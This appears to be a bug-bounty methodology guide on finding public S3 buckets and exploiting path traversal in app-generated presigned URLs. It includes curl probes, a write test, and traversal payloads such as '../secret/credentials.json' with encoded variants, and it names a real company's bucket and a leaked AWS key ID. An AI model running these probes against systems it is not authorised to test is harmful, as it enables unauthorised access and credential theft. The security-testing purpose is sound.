# S3 Bucket Enumeration & Testing

## Discovery Signals

During HTTP probing, look for these indicators of S3/cloud storage:

| Signal | Meaning |
|--------|---------|
| `Content-Type: application/xml` with large response (>100KB) | Likely S3 ListBucket response |
| `<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">` | Confirmed public listing |
| `<Error><Code>AccessDenied</Code>` | Bucket exists but listing denied |
| `<Error><Code>NoSuchBucket</Code>` | Bucket doesn't exist (takeover candidate) |
| Response header `x-amz-bucket-region` | Confirms S3, reveals region |
| CNAME to `*.s3.amazonaws.com` or `*.s3-*.amazonaws.com` | S3-backed subdomain |

## Testing Sequence

### 1. Confirm listing
```bash
curl -s "https://target.example.com" | head -5
# Look for <ListBucketResult>
```

### 2. Extract bucket name
```bash
curl -s "https://target.example.com" | grep -o '<Name>[^<]*</Name>'
```

### 3. Check for sub-prefixes (directories)
```bash
curl -s "https://target.example.com/?prefix=&delimiter=/"
# Look for <CommonPrefixes><Prefix>dirname/</Prefix></CommonPrefixes>
```

### 4. Test write access (non-destructive)
```bash
# PUT a harmless file — check if 403 or 200
curl -s -o /dev/null -w "%{http_code}" -X PUT \
  "https://target.example.com/security-test-delete-me.txt" \
  -d "security test - please delete"
# 403 = read-only (good), 200 = WRITABLE (critical finding!)
```

### 5. Paginate to find all content
```bash
# S3 returns max 1000 keys per request. Use marker for pagination:
curl -s "https://target.example.com/?marker=LAST_KEY_FROM_PREVIOUS&max-keys=10"
```

### 6. Look for sensitive prefixes
```bash
for prefix in config backup db logs admin internal private secret \
  credentials env data export dump .git .env terraform; do
  size=$(curl -s -o /dev/null -w "%{size_download}" \
    "https://target.example.com/?prefix=${prefix}/&max-keys=5" --max-time 5)
  # If size differs from empty-listing size, prefix has content
done
```

**Pitfall — Prefix Filter False Positive:** When testing sensitive prefixes (backup/, config/, etc.), don't use `grep -c '<Key>'` to detect content — the XML tag `<Key>` appears in the response structure regardless of whether objects match the prefix. Instead, parse actual `<Key>value</Key>` content and check if values start with your prefix:

```bash
# WRONG: counts XML tags, always returns 1+
curl -s "https://target/?prefix=backup/" | grep -c '<Key>'

# RIGHT: parse actual key values and check prefix match
curl -s "https://target/?list-type=2&max-keys=5&prefix=backup/" | \
  python3 -c "import sys,re; data=sys.stdin.read(); keys=re.findall(r'<Key>([^<]+)</Key>', data); matches=[k for k in keys if k.startswith('backup/')]; print(f'Found: {len(matches)}')"
```

Also: if the bucket has no delimiter-based structure (flat namespace under one prefix like `alice/`), ALL prefix queries return the same objects starting from the beginning of the listing. The S3 API doesn't error on non-matching prefixes — it just returns an empty `<Contents>` set or falls through to the default listing.

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Listing enabled + write access + serves content to users | Critical (supply chain) |
| Listing enabled + PII/secrets/source code exposed | High |
| Listing enabled + internal docs/configs | Medium |
| Listing enabled + only public assets (images, marketing) | Low |
| Listing enabled + write access but no user-facing content | Medium-High |

## Report Template

```
Title: Public S3 Bucket Listing on [subdomain]
Severity: [Low/Medium/High/Critical]

## Summary
The S3 bucket `[bucket-name]` backing `[subdomain]` has public ListBucket 
permissions enabled, allowing unauthenticated enumeration of all objects.

## Steps to Reproduce
1. Navigate to: https://[subdomain]/
2. Observe XML response with <ListBucketResult> containing object keys

## Impact
- [Describe what's exposed: file names, internal IDs, timestamps]
- [Note if write access exists]
- [Note if sensitive data is present]

## Evidence
- Bucket name: [name]
- IsTruncated: [true/false] (indicates >1000 objects)
- Sample keys: [list 3-5 representative keys]
- Write test: [403 Denied / 200 Success]
```

## Real-World Example (Grab)

- Subdomain: `huawei-image-ads-cms.grab.com` (also `huawei-video-ads-cms.grab.com`)
- Bucket: `prd-galaxy-assets`
- Content: 1000+ ad campaign images under `alice/images/` prefix
- Write: Denied (403)
- Severity: Low (public ad images, no PII, no write)
- Both subdomains pointed to the same bucket

---

## Presigned URL Path Traversal (App-Generated Presigned URLs)

### When to Test
- App has download/file endpoints that redirect (302) to S3 presigned URLs
- URL pattern: `https://bucket.s3.amazonaws.com/key?X-Amz-Algorithm=...&X-Amz-Credential=...`
- File parameter controls the S3 object key

### Attack Pattern

**Step 1: Identify the key prefix**
Normal request: `/download?file=report.pdf` → redirects to `bucket.s3.amazonaws.com/upload/report.pdf?...`
The app prepends `upload/` to your input.

**Step 2: Escape the prefix with ../**
```
/download?file=../
```
Generates presigned URL for bucket root: `bucket.s3.amazonaws.com/?...`
If bucket allows ListBucket via presigned GET → full object listing returned.

**Step 3: Download arbitrary objects**
```
/download?file=../secret/credentials.json
/download?file=profile_avatar/secret.txt
```

### What to Extract from Presigned URLs

```
X-Amz-Credential=AKIA3PI3WQDUDLEYSVHT/20260614/us-east-1/s3/aws4_request
              ^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^  ^^^^^^^^^
              AWS Access Key ID     Date      Region
```

| Field | Intelligence Value |
|-------|-------------------|
| Access Key ID (AKIA...) | Identifies IAM user, can test other AWS services |
| Region | Narrows target infrastructure location |
| Bucket name | From URL hostname: `bucket-name.s3.amazonaws.com` |
| Key prefix | Reveals directory structure |

### ListBucket via Presigned URL

When `?file=../` produces a presigned GET to the bucket root, following the redirect often returns ListBucketResult XML:
```xml
<ListBucketResult>
  <Name>bucket-name</Name>
  <Contents><Key>upload/file1.pdf</Key><Size>340491</Size></Contents>
  <Contents><Key>upload/secret.txt</Key><Size>47</Size></Contents>
</ListBucketResult>
```

This works because presigned GET on a bucket (no key) = ListObjects if the IAM policy allows `s3:ListBucket`.

### Traversal Variants to Test
```
../                  → bucket root listing
../../               → same (can't escape bucket)
../%00               → null byte injection
....//               → double-encoding bypass
..%2f                → URL-encoded slash
%2e%2e/              → URL-encoded dots
```

### Real-World Example: mock.hackme.secops.group (June 2026)
- Endpoint: `/s3download?image_name=Certifications.pdf`
- Normal key: `upload/Certifications.pdf`
- Traversal: `image_name=../` → presigned URL to bucket root → ListBucketResult with 6 objects
- Sensitive file: `upload/profile_avatar/secret.txt` (47 bytes, contained flag)
- Access Key leaked: `AKIA3PI3WQDUDLEYSVHT` in every presigned URL
